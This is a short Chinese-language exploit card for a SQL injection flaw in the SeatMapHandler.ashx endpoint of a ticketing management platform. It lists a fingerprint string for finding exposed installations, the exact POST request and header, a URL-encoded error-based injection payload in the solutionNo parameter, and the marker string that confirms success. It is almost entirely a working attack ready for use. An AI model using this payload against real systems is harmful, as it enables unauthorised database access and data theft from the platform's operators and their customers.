# 中城科信票务管理平台-SQL注入-SeatMapHandler

- **系统**：中城科信票务管理平台　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`"js/System/jquery.ellipsis.min.js"`
- **请求**：`POST /SystemManager/Comm/SeatMapHandler.ashx HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
Method=GetZoneInfo&solutionNo=%27+AND+7821+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%287821%3D7821%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29--+Vjyh
```
- **预期**：200　|　qkzvq1qqpkq